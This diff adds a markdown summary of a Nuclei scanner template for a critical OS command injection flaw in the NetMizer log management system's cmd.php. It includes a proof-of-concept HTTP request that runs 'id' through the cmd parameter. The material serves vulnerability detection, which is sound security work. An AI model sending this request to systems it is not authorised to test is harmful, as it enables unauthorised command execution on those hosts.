@@ -1,0 +1,19 @@
+# Nuclei Template: NetMizer LogManagement System cmd.php - Remote Code Execution
+**Template ID:** netmizer-cmd-rce
+**Vulnerability Class:** OS Command Injection
+**Severity:** Critical
+**CWE:** CWE-78
+**Source:** Nuclei Template (`netmizer-cmd-rce.yaml`)
+
+## Vulnerability Information & PoC
+
+## Description
+Remote Command Execution vulnerability in the NetMizer log management system cmd.php, and the attacker can execute the command by passing in the cmd parameter.
+
+## Steps to reproduce / Exploit Payload
+```http
+GET {{BaseURL}}/data/manage/cmd.php?cmd=id
+```
+
+## References
+- https://github.com/Threekiii/Awesome-POC/blob/master/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/NetMizer%20%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20cmd.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
